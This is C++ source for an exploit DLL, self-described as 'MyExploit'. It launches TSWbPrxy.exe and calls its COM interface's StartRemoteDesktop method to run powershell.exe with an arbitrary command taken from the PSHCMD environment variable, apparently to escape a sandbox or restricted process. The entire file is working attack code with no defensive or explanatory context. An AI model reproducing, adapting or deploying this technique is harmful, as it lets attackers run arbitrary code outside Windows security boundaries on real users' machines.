// MyExploit.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include <objbase.h>

#import "C:\\Windows\\System32\\TSWbPrxy.exe" named_guids no_namespace
#define MAX_ENV 32767

bstr_t GetEnv(LPCSTR env)
{
	CHAR buf[MAX_ENV];

	GetEnvironmentVariable(env, buf, MAX_ENV);

	return buf;
}

void DoTSWbPrxyExploit() {
	HRESULT			hr;
	IMSTSWebProxy   *pUnk;

	CHAR cmdline[] = "TSWbPrxy.exe";
	STARTUPINFO startInfo = { 0 };
	PROCESS_INFORMATION procInfo = { 0 };

	hr = CreateProcess(GetEnv("windir") + "\\System32\\TSWbPrxy.exe", cmdline, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &startInfo, &procInfo);
	if (hr == 0)
		return;

	hr = CoCreateInstance(CLSID_MSTSWebProxy, NULL, CLSCTX_SERVER, IID_IMSTSWebProxy, (void**)&pUnk);
	if (hr != 0)
		return;

	pUnk->StartRemoteDesktop(GetEnv("windir") + "\\system32\\WindowsPowerShell\\v1.0\\powershell.exe", GetEnv("PSHCMD"));
	pUnk->Release();
}

DWORD CALLBACK ExploitThread(LPVOID hModule)
{
	CoInitialize(nullptr);
	DoTSWbPrxyExploit();
	CoUninitialize();

	FreeLibraryAndExitThread((HMODULE)hModule, 0);
}